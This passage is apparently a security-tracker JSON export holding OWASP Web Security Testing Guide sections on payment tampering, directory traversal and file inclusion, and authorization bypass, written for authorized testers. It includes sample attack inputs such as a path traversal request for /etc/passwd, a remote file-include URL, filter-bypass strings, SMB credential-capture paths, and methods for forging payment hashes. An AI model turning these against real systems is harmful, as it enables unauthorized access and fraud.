Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)\n* [Why File Upload Forms are a Major Security Threat](https://www.acunetix.com/websitesecurity/upload-forms-threat/)\n* [8 Basic Rules to Implement Secure File Uploads](https://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads)\n* [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)\n* [How to Tell if a File is Malicious](https://web.archive.org/web/20210710090809/https://www.techsupportalert.com/content/how-tell-if-file-malicious.htm)\n* [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)\n* [Implementing Secure File Upload](https://infosecauditor.wordpress.com/tag/malicious-file-upload/)\n* [Metasploit Generating Payloads](https://www.offensive-security.com/metasploit-unleashed/Generating_Payloads)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-10 Test Payment Functionality","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Many applications implement payment functionality, including e-commerce sites, subscriptions, charities, donation sites and currency exchanges. The security of this functionality is critical, as vulnerabilities could allow attackers to steal from the organization, make fraudulent purchases, or even to steal payment card details from other users. These issue could result in not only reputational damage to the organization, but also significant financial losses, both from direct losses and fines from industry regulators.","TestingInstructions":"## Test Objectives\n\n* Determine whether the business logic for the e-commerce functionality is robust.\n* Understand how the payment functionality works.\n* Determine whether the payment functionality is secure.\n\n## How to Test\n\n### Payment Gateway Integration Methods\n\nThere are several different ways that applications can integrate payment functionality, and the testing approach will vary depending on which one is used. The most common methods are:\n\n* Redirecting the user to a third-party payment gateway.\n* Loading a third-party payment gateway in an IFRAME on the application.\n* Having a HTML form that makes a cross-domain POST request to a third-party payment gateway.\n* Accepting the card details directly, and then making a POST from the application backend to the payment gateway\u2019s API.\n\n### PCI DSS\n\nThe Payment Card Industry Data Security Standard (PCI DSS) is a standard that organizations are required to follow in order process debit and card payments (although it\u2019s important to note that it is not a law). A full discussion of this standard is outside of the scope of this guide (and of most penetration tests) - but it\u2019s useful for testers to understand a few key points.\nThe most common misconception about PCI DSS is that it only applies to systems that store cardholder data (i.e, debit or credit card details). This is incorrect: it applies to any system that \u201Cstores, processes or transmits\u201D this information. Exactly which requirements need to be followed depends on how which of the payment gateway integration methods are used. The [Visa Processing E-Commerce Payments guidance](https://www.visa.co.uk/dam/VCOM/regional/ve/unitedkingdom/PDF/risk/processing-e-commerce-payments-guide-73-17337.pdf) provides further details on this, but as a brief summary:\n\n| Integration Method | Self Assessment Questionnaire (SAQ) |\n| ------------------ | ----------------------------------- |\n| Redirect | [SAQ A](https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2_1-SAQ-A.pdf) |\n| IFRAME | [SAQ A](https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2_1-SAQ-A.pdf) |\n| Cross-domain POST | [SAQ A-EP](https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2-SAQ-A_EP-rev1_1.pdf) |\n| Backend API | [SAQ D](https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2_1-SAQ-D_Merchant.pdf) |\n\nIn addition to the differences in the attack surface and risk profile of each approach, there is also a significant difference in the number of requirements between SAQ A (22 requirements) and SAQ D (329 requirements) that the organization needs to meet. As such, it\u2019s worth highlighting applications that are not using an redirect or IFRAME, as they represent increased technical and compliance risks.\n\n### Quantity Tampering\n\nMost e-commerce sites allow users to add items to a basket before they start the checkout process. This basket should keep track of which items that have been added, and the quantity of each item. The quantity should normally be a positive integer, but if the site does not properly validate this then it may be possible to specify a decimal quantity of an item (such as \u00600.1\u0060), or a negative quantity (such as \u0060-1\u0060). Depending on the backend processing, adding negative quantities of an item may result in a negative value, reducing the overall cost of the basket.\nThere are usually multiple ways to modify the contents of the basket that should be tested, such as:\n\n* Adding a negative quantity of an item.\n* Repeatedly removing items until the quantity is negative.\n* Updating the quantity to a negative value.\n\nSome sites may also provide a drop-down menu of valid quantities (such as items that must be bought in packs of 10), and it may be possible to tamper these requests to add other quantities of items.\nIf the full basket details are passed to the payment gateway (rather than simply passing a total value), it may also be possible to tamper the values at that stage.\nFinally, if the application is vulnerable to [HTTP parameter pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution) then it may be possible to cause unexpected behavior by passing a parameter multiple times, such as:\n\n\u0060\u0060\u0060\nPOST /api/basket/add\nHost: example.org\n\nitem_id=1\u0026quantity=5\u0026quantity=4\n\u0060\u0060\u0060\n\n### Price Tampering\n\n#### On the Application\n\nWhen adding an item to the basket, the application should only include the item and a quantity, such as the example request below:\n\n\u0060\u0060\u0060\nPOST /api/basket/add HTTP/1.1\nHost: example.org\n\nitem_id=1\u0026quantity=5\n\u0060\u0060\u0060\n\nHowever, in some cases the application may also include the price, meaning that it may be possible to tamper it:\n\n\u0060\u0060\u0060\nPOST /api/basket/add HTTP/1.1\nHost: example.org\n\nitem_id=1\u0026quantity=5\u0026price=2.00\n\u0060\u0060\u0060\n\nDifferent types of items may have different validation rules, so each type needs to be separately tested. Some applications also allow users to add an optional donation to charity as part of their purchase, and this donation can usually be an arbitrary amount. If this amount is not validated, it may be possible to add a negative donation amount, which would then reduce the total value of the basket.\n\n#### On the Payment Gateway\n\nIf the checkout process is performed on a third-party payment gateway, then it may be possible to tamper with the prices between the application and the gateway.\nThe transfer to the gateway may be performed using a cross-domain POST to the gateway, as shown in the HTML example below.\n\n\u003E Note: The card details are not included in this request - the user will be prompted for them on the payment gateway:\n\n\u0060\u0060\u0060\n\u003Cform action=\u0022https://example.org/process_payment\u0022 method=\u0022POST\u0022\u003E\n    \u003Cinput type=\u0022hidden\u0022 id=\u0022merchant_id\u0022 value=\u0022123\u0022 /\u003E\n    \u003Cinput type=\u0022hidden\u0022 id=\u0022basket_id\u0022 value=\u0022456\u0022 /\u003E\n    \u003Cinput type=\u0022hidden\u0022 id=\u0022item_id\u0022 value=\u00221\u0022 /\u003E\n    \u003Cinput type=\u0022hidden\u0022 id=\u0022item_quantity\u0022 value=\u00225\u0022 /\u003E\n    \u003Cinput type=\u0022hidden\u0022 id=\u0022item_total\u0022 value=\u002220.00\u0022 /\u003E\n    \u003Cinput type=\u0022hidden\u0022 id=\u0022shipping_total\u0022 value=\u00222.00\u0022 /\u003E\n    \u003Cinput type=\u0022hidden\u0022 id=\u0022basket_total\u0022 value=\u002222.00\u0022 /\u003E\n    \u003Cinput type=\u0022hidden\u0022 id=\u0022currency\u0022 value=\u0022GBP\u0022 /\u003E\n    \u003Cinput type=\u0022submit\u0022 id=\u0022submit\u0022 value=\u0022submit\u0022 /\u003E\n\u003C/form\u003E\n\u0060\u0060\u0060\n\nBy modifying the HTML form or intercepting the POST request, it may be possible to modify the prices of items, and to effectively purchase them for less. Note that many payment gateways will reject a transaction with a value of zero, so a total of 0.01 is more likely to succeed. However, some payment gateways may accept negative values (used to process refunds). Where there are multiple values (such as item prices, a shipping cost, and the total basket cost), all of these should be tested.\nIf the payment gateway uses an IFRAME instead, it may be possible to perform a similar type of attack by modifying the IFRAME URL:\n\n\u0060\u0060\u0060\n\u003Ciframe src=\u0022https://example.org/payment_iframe?merchant_id=123\u0026basket_total=22.00\u0022 /\u003E\n\u0060\u0060\u0060\n\n\u003E Note: Payment gateways are usually run by a third-parties, and as such may not be included in the scope of testing. This means that while price tampering may be acceptable, other types of attacks (such as SQL injection) should not be performed without explicit written approval).\n\n#### Encrypted Transaction Details\n\nIn order to prevent the transaction being tampered with, some payment gateways will encrypt the details of the request that is made to them. For example, [PayPal](https://developer.paypal.com/api/nvp-soap/paypal-payments-standard/integration-guide/encryptedwebpayments/#link-usingewptoprotectmanuallycreatedpaymentbuttons) does this using public key cryptography.\nThe first thing to try is making an unencrypted request, as some payment gateways allow insecure transactions unless they have been specifically configured to reject them.\nIf this doesn\u2019t work, then you need to find the public key that is used to encrypt the transaction details, which could be exposed in a backup of the application, or if you can find a directory traversal vulnerability.\nAlternatively, it\u2019s possible that the application re-uses the same public/private key pair for the payment gateway and its digital certificate. You can obtain the public key from the server with the following command:\n\n\u0060\u0060\u0060\necho -e \u0027\\0\u0027 | openssl s_client -connect example.org:443 2\u003E/dev/null | openssl x509 -pubkey -noout\n\u0060\u0060\u0060\n\nOnce you have this key, you can then try and create an encrypted request (based on the payment gateway\u2019s documentation), and submit it to the gateway to see if it\u2019s accepted.\n\n#### Secure Hashes\n\nOther payment gateways use a secure hash (or a HMAC) of the transaction details to prevent tampering. The exact details of how this is done will vary between providers (for example, [Adyen](https://docs.adyen.com/online-payments/classic-integrations/hosted-payment-pages/hmac-signature-calculation) uses HMAC-SHA256), but it will normally include the details of the transaction and a secret value. For example, a hash may be calculated as:\n\n\u0060\u0060\u0060\n$secure_hash = md5($merchant_id . $transaction_id . $items . $total_value . $secret)\n\u0060\u0060\u0060\n\nThis value is then added to the POST request that is sent to the payment gateway, and verified to ensure that the transaction hasn\u2019t been tampered with.\nThe first thing to try is removing the secure hash, as some payment gateways allow insecure transactions unless a specific configuration option has been set.\nThe POST request should contain all of the values required to calculate this hash, other than the secret key. This means that if you know how the hash is calculated (which should be included in the payment gateway\u2019s documentation), then you can attempt to brute-force the secret. Alternatively, if the site is running an off-the-shelf application, there may be a default secret in the configuration files or source code. Finally, if you can find a backup of the site, or otherwise gain access to the configuration files, you may be able to find the secret there.\nIf you can obtain this secret, you can then tamper the transaction details, and then generate your own secure hash which will be accepted by the payment gateway.\n\n#### Currency Tampering\n\nIf it\u2019s not possible to tamper with the actual prices, it may be possible to change the currency that is used, especially where applications support multiple currencies. For example, the application may validate that the price is 10, but if you can change the currency so that you pay 10 USD rather than 10 GBP, this would allow you to purchase items more cheaply.\n\n#### Time Delayed Requests\n\nIf the value of items on the site changes over time (for example on a currency exchange), then it may be possible to buy or sell at an old price by intercepting requests using a local proxy and delaying them. In order for this to be exploitable, the price would need to either be included in the request, or linked to something in the request (such as session or transaction ID). The example below shows how this could potentially be exploited on a application that allows users to buy and sell gold:\n\n* View the current price of gold on the site.\n* Initiate a buy request for 1oz of gold.\n* Intercept and freeze the request.\n* Wait one minutes to check the price of gold again:\n    * If it increases, allow the transaction to complete, and buy the gold for less than it\u2019s current value.\n    * If it decreases, drop the request request.\n\nIf the site allows the user to make payments using cryptocurrencies (which are usually far more volatile), it may be possible to exploit this by obtaining a fixed price in that cryptocurrency, and then waiting to see if the value rises or falls compared to the main currency used by the site.\n\n### Discount Codes\n\nIf the application supports discount codes, then there are various checks that should be carried out:\n\n* Are the codes easily guessable (TEST, TEST10, SORRY, SORRY10, company name, etc)?\n    * If a code has a number in, can more codes be found by increasing the number?\n* Is there any brute-force protection?\n* Can multiple discount codes be applied at once?\n* Can discount codes be applied multiple times?\n* Can you [inject wildcard characters](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#sql-wildcard-injection) such as \u0060%\u0060 or \u0060*\u0060?\n* Are discount codes exposed in the HTML source or hidden \u0060\u003Cinput\u003E\u0060 fields anywhere on the application?\n\nIn addition to these, the usual vulnerabilities such as SQL injection should be tested for.\n\n### Breaking Payment Flows\n\nIf the checkout or payment process on an application involves multiple stages (such as adding items to a basket, entering discount codes, entering shipping details, and entering billing information), then it may be possible to cause unintended behavior by performing these steps outside of the expected sequence. For example, you could try:\n\n* Modifying the shipping address after the billing details have been entered to reduce shipping costs.\n* Removing items after entering shipping details, to avoid a minimum basket value.\n* Modifying the contents of the basket after applying a discount code.\n* Modifying the contents of a basket after completing the checkout process.\n\nIt may also be possible to skip the entire payment process for the transaction. For example, if the application redirects to a third-party payment gateway, the payment flow may be:\n\n* The user enters details on the application.\n* The user is redirected to the third-party payment gateway.\n* The user enters their card details.\n    * If the payment is successful, they are redirected to \u0060success.php\u0060 on the application.\n    * If the payment is unsuccessful, they are redirected to \u0060failure.php\u0060 on the application\n* The application updates its order database, and processes the order if it was successful.\n\nDepending on whether the application actually validates that the payment on the gateway was successful, it may be possible to force-browse to the \u0060success.php\u0060 page (possibly including a transaction ID if one is required), which would cause the site to process the order as though the payment was successful. Additionally, it may be possible to make repeated requests to the \u0060success.php\u0060 page to cause an order to be processed multiple times.\n\n### Exploiting Transaction Processing Fees\n\nMerchants normally have to pay fees for every transaction processed, which are typically made up of a small fixed fee, and a percentage of the total value. This means that receiving very small payments (such as $0.01) may result in the merchant actually losing money, as the transaction processing fees are greater than the total value of the transaction.\nThis issue is rarely exploitable on e-commerce sites, as the price of the cheapest item is usually high enough to prevent it. However, if the site allows customers to make payments with arbitrary amounts (such as donations), check that it enforces a sensible minimum value.\n\n### Test Payment Cards\n\nMost payment gateways have a set of defined test card details, which can be used by developers during testing and debugging. These should only be usable on development or sandbox versions of the gateways, but may be accepted on live sites if they have been misconfigured.\nExamples of these test details for various payment gateways are listed below:\n\n* [Adyen - Test Card Numbers](https://docs.adyen.com/development-resources/test-cards/test-card-numbers)\n* [Globalpay - Test Cards](https://developer.globalpay.com/resources/test-card-numbers)\n* [Stripe - Basic Test Card Numbers](https://stripe.com/docs/testing#cards)\n* [Worldpay - Test Card Numbers](http://support.worldpay.com/support/kb/bg/testandgolive/tgl5103.html)\n\n### Testing Logistics\n\nTesting payment functionality on applications can introduce additional complexity, especially if a live site is being tested. Areas that need to be considered include:\n\n* Obtaining test card payment details for the application.\n    * If these are not available, then it may be possible to obtain a pre-paid card or an alternative.\n* Keeping a record of any orders that are made so that they can be cancelled and refunded.\n* Not placing orders that can\u2019t be cancelled, or that will cause other actions (such as goods being immediately dispatched from a warehouse).\n\n## Related Test Cases\n\n* [Testing for HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)\n* [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)\n* [Testing for the Circumvention of Work Flows](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows)","Details":null,"Implication":null,"Recommendation":"* Avoid storing, transmitting or processing card details wherever possible.\n    * Use a redirect or IFRAME for the payment gateway.\n* Review payment gateway documentation and use all available security features (such as encryption and secure hashes).\n* Handle all pricing related information on server-side:\n    * The only things included in client-side requests should be item IDs and quantities.\n* Implement appropriate input validation and business logic constraints (such as checking for negative item numbers or values).\n* Ensure that application payment flow is robust and that steps can\u2019t be performed out of sequence.","References":"* [Payment Card Industry Data Security Standard (PCI DSS)](https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf)\n* [Visa Processing E-Commerce Payments guidance](https://www.visa.co.uk/dam/VCOM/regional/ve/unitedkingdom/PDF/risk/processing-e-commerce-payments-guide-73-17337.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHZ-01 Testing Directory Traversal File Include","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nMany web applications use and manage files as part of their daily operation. Using input validation methods that have not been well designed or deployed, an aggressor could exploit the system in order to read or write files that are not intended to be accessible. In particular situations, it could be possible to execute arbitrary code or system commands.\nTraditionally, web servers and web applications implement authentication mechanisms to control access to files and resources. Web servers try to confine users\u2019 files inside a \u201Croot directory\u201D or \u201Cweb document root\u201D, which represents a physical directory on the file system. Users have to consider this directory as the base directory into the hierarchical structure of the web application.\nThe definition of the privileges is made using\u00A0Access Control Lists\u00A0(ACL) which identify which users or groups are supposed to be able to access, modify, or execute a specific file on the server. These mechanisms are designed to prevent malicious users from accessing sensitive files (for example, the common\u00A0\u0060/etc/passwd\u0060\u00A0file on a UNIX-like platform) or to avoid the execution of system commands.\nMany web applications use server-side scripts to include different kinds of files. It is quite common to use this method to manage images, templates, load static texts, and so on. Unfortunately, these applications expose security vulnerabilities if input parameters (i.e., form parameters, cookie values) are not correctly validated.\nIn web servers and web applications, this kind of problem arises in path traversal/file include attacks. By exploiting this kind of vulnerability, an attacker is able to read directories or files which they normally couldn\u2019t read, access data outside the web document root, or include scripts and other kinds of files from external sites.\nFor the purpose of the OWASP Testing Guide, only the security threats related to web applications will be considered and not threats to web servers (e.g., the infamous \u0060%5c\u0060 escape code into Microsoft IIS web server). Further reading suggestions will be provided in the references section for interested readers.\nThis kind of attack is also known as the\u00A0dot-dot-slash\u00A0attack (\u0060../\u0060),\u00A0directory traversal,\u00A0directory climbing, or\u00A0backtracking.\nDuring an assessment, to discover path traversal and file include flaws, testers need to perform two different stages:\n\n1. Input Vectors Enumeration (a systematic evaluation of each input vector)\n2. Testing Techniques (a methodical evaluation of each attack technique used by an attacker to exploit the vulnerability)\n\n## Test Objectives\n\n* Identify injection points that pertain to path traversal.\n* Assess bypassing techniques and identify the extent of path traversal.","TestingInstructions":"## How to Test\n\n### Black-Box Testing\n\n#### Input Vectors Enumeration\n\nIn order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user. This also includes HTTP GET and POST queries and common options like file uploads and HTML forms.\nHere are some examples of the checks to be performed at this stage:\n\n* Are there request parameters which could be used for file-related operations?\n* Are there unusual file extensions?\n* Are there interesting variable names?\n    * \u0060http://example.com/getUserProfile.jsp?item=ikki.html\u0060\n    * \u0060http://example.com/index.php?file=content\u0060\n    * \u0060http://example.com/main.cgi?home=index.htm\u0060\n* Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates?\n    * \u0060Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower\u0060\n    * \u0060Cookie: USER=1826cc8f:PSTYLE=GreenDotRed\u0060\n\n#### Testing Techniques\n\nThe next stage of testing is analyzing the input validation functions present in the web application. Using the previous example, the dynamic page called \u0060getUserProfile.jsp\u0060 loads static information from a file and shows the content to users. An attacker could insert the malicious string \u0060../../../../etc/passwd\u0060 to include the password hash file of a Linux/UNIX system. Obviously, this kind of attack is possible only if the validation checkpoint fails; according to the file system privileges, the web application itself must be able to read the file.\n**Note:** To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting \u0060/etc/passwd\u0060 from an IIS web server.\n\n\u0060\u0060\u0060\nhttp://example.com/getUserProfile.jsp?item=../../../../etc/passwd\n\u0060\u0060\u0060\n\nAnother common example is including content from an external source:\n\n\u0060\u0060\u0060\nhttp://example.com/index.php?file=http://www.owasp.org/malicioustxt\n\u0060\u0060\u0060\n\nThe same can be applied to cookies or any other input vector that is used for dynamic page generation.\nMore file inclusion payloads can be found at [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)\nIt is important to note that different operating systems use different path separators\n\n* Unix-like OS:\n    * root directory: \u0060/\u0060\n    * directory separator: \u0060/\u0060\n* Windows OS:\n    * root directory: \u0060\u003Cdrive letter\u003E:\u0060\n    * directory separator: \u0060\\\u0060 or \u0060/\u0060\n* Classic macOS:\n    * root directory: \u0060\u003Cdrive letter\u003E:\u0060\n    * directory separator: \u0060:\u0060\n\nIt\u2019s a common mistake by developers to not expect every form of encoding and therefore only do validation for basic encoded content. If at first the test string isn\u2019t successful, try another encoding scheme.\nYou can find encoding techniques and ready to use directory traversal payloads at [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)\n\n#### Windows Specific Considerations\n\n* Windows shell: Appending any of the following to paths used in a shell command results in no difference in function:\n    * Angle brackets \u0060\u003C\u0060 and \u0060\u003E\u0060 at the end of the path\n    * Double quotes (closed properly) at the end of the path\n    * Extraneous current directory markers such as \u0060./\u0060 or \u0060.\\\\\u0060\n    * Extraneous parent directory markers with arbitrary items that may or may not exist:\n        * \u0060file.txt\u0060\n        * \u0060file.txt...\u0060\n        * \u0060file.txt\u003Cspaces\u003E\u0060\n        * \u0060file.txt\u0022\u0022\u0022\u0022\u0060\n        * \u0060file.txt\u003C\u003C\u003C\u003E\u003E\u003E\u003C\u0060\n        * \u0060./././file.txt\u0060\n        * \u0060nonexistant/../file.txt\u0060\n* Windows API: The following items are discarded when used in any shell command or API call where a string is taken as a filename:\n    * periods\n    * spaces\n* Windows UNC Filepaths: Used to reference files on SMB shares. Sometimes, an application can be made to refer to files on a remote UNC filepath. If so, the Windows SMB server may send stored credentials to the attacker, which can be captured and cracked. These may also be used with a self-referential IP address or domain name to evade filters, or used to access files on SMB shares inaccessible to the attacker, but accessible from the web server.\n    * \u0060\\\\server_or_ip\\path\\to\\file.abc\u0060\n    * \u0060\\\\?\\server_or_ip\\path\\to\\file.abc\u0060\n* Windows NT Device Namespace: Used to refer to the Windows device namespace. Certain references will allow access to file systems using a different path.\n    * May be equivalent to a drive letter such as \u0060c:\\\u0060, or even a drive volume without an assigned letter: \u0060\\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\\u0060\n    * Refers to the first disc drive on the machine: \u0060\\\\.\\CdRom0\\\u0060\n\n### Gray-Box Testing\n\nWhen the analysis is performed with a gray-box testing approach, testers have to follow the same methodology as in black-box testing. However, since they can review the source code, it is possible to search the input vectors more easily and accurately. During a source code review, they can use simple tools (such as the *grep* command) to search for one or more common patterns within the application code: inclusion functions/methods, filesystem operations, and so on.\n\n* \u0060PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...\u0060\n* \u0060JSP/Servlet: java.io.File(), java.io.FileReader(), ...\u0060\n* \u0060ASP: include file, include virtual, ...\u0060\n\nUsing online code search engines (e.g., [Searchcode](https://searchcode.com/)), it may also be possible to find path traversal flaws in Open Source software published on the internet.\nFor PHP, testers can use the following regex:\n\n\u0060\u0060\u0060\n(include|require)(_once)?\\s*[\u0027\u0022(]?\\s*\\$_(GET|POST|COOKIE)\n\u0060\u0060\u0060\n\nUsing the gray-box testing method, it is possible to discover vulnerabilities that are usually harder to discover, or even impossible to find during a standard black-box assessment.\nSome web applications generate dynamic pages using values and parameters stored in a database. It may be possible to insert specially crafted path traversal strings when the application adds data to the database. This kind of security problem is difficult to discover due to the fact the parameters inside the inclusion functions seem internal and **safe** but are not in reality.\nAdditionally, by reviewing the source code it is possible to analyze the functions that are supposed to handle invalid input: some developers try to change invalid input to make it valid, avoiding warnings and errors. These functions are usually prone to security flaws.\nConsider a web application with these instructions:\n\n\u0060\u0060\u0060\nfilename = Request.QueryString(\u0022file\u0022);\nReplace(filename, \u0022/\u0022,\u0022\\\u0022);\nReplace(filename, \u0022..\\\u0022,\u0022\u0022);\n\u0060\u0060\u0060\n\nTesting for the flaw is achieved by:\n\n\u0060\u0060\u0060\nfile=....//....//boot.ini\nfile=....\\\\....\\\\boot.ini\nfile= ..\\..\\boot.ini\n\u0060\u0060\u0060\n\n## Tools\n\n* [DotDotPwn - The Directory Traversal Fuzzer](https://github.com/wireghoul/dotdotpwn)\n* [Path Traversal Fuzz Strings (from WFuzz Tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt)\n* [ZAP](https://www.zaproxy.org/)\n* [Burp Suite](https://portswigger.net/)\n* Encoding/Decoding tools\n* [String searcher \u201Cgrep\u201D](https://www.gnu.org/software/grep/)\n* [DirBuster](https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)\n* [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)\n\n### Whitepapers\n\n* [phpBB Attachment Mod Directory Traversal HTTP POST Injection](https://seclists.org/vulnwatch/2004/q4/33)\n* [Windows File Pseudonyms: Pwnage and Poetry](https://www.slideshare.net/BaronZor/windows-file-pseudonyms)\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"05-Authorization Testing","Description":"05-Authorization Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"de1d0fac-b799-452f-946f-17a41cf48092","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHZ-02 Testing for Bypassing Authorization Schema","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThis kind of test focuses on verifying how the authorization schema has been implemented for each role or privilege to get access to reserved functions and resources.\nFor every specific role the tester holds during the assessment and for every function and request that the application executes during the post-authentication phase, it is necessary to verify:\n\n* Is it possible to access that resource even if the user is not authenticated?\n* Is it possible to access that resource after the log-out?\n* Is it possible to access functions and resources that should be accessible to a user that holds a different role or privilege?\n\nTry to access the application as an administrative user and track all the administrative functions.\n\n* Is it possible to access administrative functions if the tester is logged in as a non-admin user?\n* Is it possible to use these administrative functions as a user with a different role and for whom that action should be denied?","TestingInstructions":"## Test Objectives\n\n* Assess if horizontal or vertical access is possible.\n\n## How to Test\n\n* Access resources and conduct operations horizontally.\n* Access resources and conduct operations vertically.\n\n### Testing for Horizontal Bypassing Authorization Schema\n\nFor every function, specific role, or request that the application executes, it is necessary to verify:\n\n* Is it possible to access resources that should be accessible to a user that holds a different identity with the same role or privilege?\n* Is it possible to operate functions on resources that should be accessible to a user that holds a different identity?\n\nFor each role:\n\n1. Register or generate two users with identical privileges.\n2. Establish and keep two different sessions active (one for each user).\n3. For every request, change the relevant parameters and the session identifier from token one to token two and diagnose the responses for each token.\n4. An application will be considered vulnerable if the responses are the same, contain same private data or indicate successful operation on other users\u2019 resource or data.\n\nFor example, suppose that the \u0060viewSettings\u0060 function is part of every account menu of the application with the same role, and it is possible to access it by requesting the following URL: \u0060https://www.example.com/account/viewSettings\u0060. Then, the following HTTP request is generated when calling the \u0060viewSettings\u0060 